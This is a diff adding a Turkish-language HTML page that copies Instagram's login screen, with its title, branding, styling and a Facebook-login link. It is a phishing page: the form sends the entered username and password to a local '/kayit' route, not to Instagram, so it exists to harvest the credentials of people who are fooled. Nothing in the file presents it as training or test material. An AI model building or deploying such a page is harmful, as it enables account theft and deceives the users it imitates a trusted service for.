@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Giriş Yap • Instagram</title>
+    <style>
+        /* Tasarım kodların aynen korunuyor */
+        :root { --bg-wash: #fafafa; --border: #dbdbdb; --primary-button: #0095f6; --secondary-text: #8e8e8e; }
+        body { background-color: var(--bg-wash); font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .login-container { background: white; border: 1px solid var(--border); padding: 40px; width: 350px; text-align: center; }
+        .logo { margin-bottom: 30px; font-size: 32px; font-weight: bold; }
+        input { width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid var(--border); border-radius: 3px; background: #fafafa; box-sizing: border-box; }
+        button { width: 100%; padding: 8px; background-color: var(--primary-button); border: none; color: white; font-weight: bold; border-radius: 8px; cursor: pointer; margin-top: 10px; }
+        .divider { margin: 20px 0; color: var(--secondary-text); font-size: 13px; }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="logo">Instagram</div>
+        
+        <form action="/kayit" method="POST"> 
+            <input type="text" name="username" placeholder="Telefon numarası, kullanıcı adı veya e-posta" required>
+            <input type="password" name="password" placeholder="Şifre" required>
+            <button type="submit">Giriş Yap</button>
+        </form>
+
+        <div class="divider">YA DA</div>
+        <a href="#" style="color: #385185; text-decoration: none; font-size: 14px; font-weight: bold;">Facebook ile Giriş Yap</a>
+    </div>
+</body>
+</html>
